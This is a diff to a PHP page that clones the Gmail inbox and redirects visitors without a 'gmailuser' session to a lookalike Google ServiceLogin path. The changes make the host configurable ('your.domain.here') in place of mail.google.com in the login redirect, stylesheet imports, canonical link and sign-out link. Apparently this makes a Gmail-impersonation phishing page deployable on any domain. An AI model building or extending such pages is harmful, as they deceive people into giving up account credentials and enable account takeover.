@@ -1,10 +1,10 @@
 <?php
-
+$hostname = "your.domain.here";
 session_start();
 
 if (!isset($_SESSION['gmailuser'])) {
 
-header('Location: /accounts/ServiceLogin?service=mail&passive=true&rm=false&continue=http%3A%2F%2Fmail.google.com%2Fmail%2F%3Fui%3Dhtml%26zy%3Dl&ltmpl=wsad&ltmplcache=2');
+header('Location: /accounts/ServiceLogin?service=mail&passive=true&rm=false&continue=http%3A%2F%2F'. $hostname .'%2Fmail%2F%3Fui%3Dhtml%26zy%3Dl&ltmpl=wsad&ltmplcache=2');
 
 die();
 
@@ -62,9 +62,9 @@ function randomId() {
 
 </pre>
 
-    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Gmail - Inbox</title><link rel="canonical" href="https://mail.google.com/mail/"/><link rel="shortcut icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon"><link rel="stylesheet" type="text/css" href="https://mail.google.com/mail/u/1/h/_//?&amp;name=c&amp;ver=6wrl3yi4mm9e&amp;v=ss" nonce="boEx14cBlaMkkZGCxMW5kA"><style type="text/css" nonce="boEx14cBlaMkkZGCxMW5kA">
+    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Gmail - Inbox</title><link rel="canonical" href="https://<?= $hostname; ?>/mail/"/><link rel="shortcut icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon"><link rel="stylesheet" type="text/css" href="https://<?= $hostname; ?>/mail/u/0/h/_//?&amp;name=c&amp;ver=6wrl3yi4mm9e&amp;v=ss" nonce="boEx14cBlaMkkZGCxMW5kA"><style type="text/css" nonce="boEx14cBlaMkkZGCxMW5kA">
 
-            @import url("https://mail.google.com/mail/u/1/h/_//?&name=a&ver=1sthyqjwgl8hj&v=ss");
+            @import url("https://<?= $hostname; ?>/mail/u/0/h/_//?&name=a&ver=1sthyqjwgl8hj&v=ss");
 
             #gbar,
 
@@ -284,7 +284,7 @@ function randomId() {
 
                 |
 
-                <a target="_top" id="gb_71" href="https://mail.google.com/mail/logout?hl=en&ec=GAdAFw" class="gb4">Sign out</a>
+                <a target="_top" id="gb_71" href="https://<?= $hostname; ?>/mail/logout?hl=en&ec=GAdAFw" class="gb4">Sign out</a>
 
             </nobr>
 
